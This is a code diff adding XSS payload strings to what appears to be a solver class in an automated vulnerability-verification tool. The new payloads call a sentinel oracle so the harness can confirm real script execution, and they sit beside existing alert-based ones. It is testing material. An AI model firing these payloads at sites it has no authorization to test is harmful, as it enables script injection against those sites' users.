@@ -164,7 +164,17 @@ abstract class BaseSolver {
 }
 
 class XSSSolver extends BaseSolver {
+  // Sentinel variants call window.__xssOracle() — the verifier's browser oracle
+  // confirms on actual execution of that callback, not on the payload reflecting
+  // in the DOM. The alert()-based variants below also reach the sentinel (the
+  // worker hooks alert/confirm/prompt/print), so legacy reflected XSS still
+  // confirms; these explicit variants additionally prove execution where the
+  // sink is not a dialog.
   private readonly payloads = [
+    "<script>window.__xssOracle&&__xssOracle()</script>",
+    "<img src=x onerror=window.__xssOracle&&__xssOracle()>",
+    "'><svg onload=window.__xssOracle&&__xssOracle()>",
+    "<body onload=window.__xssOracle&&__xssOracle()>",
     "<script>alert(document.domain)</script>",
     "<img src=x onerror=alert(1)>",
     "javascript:alert(1)",
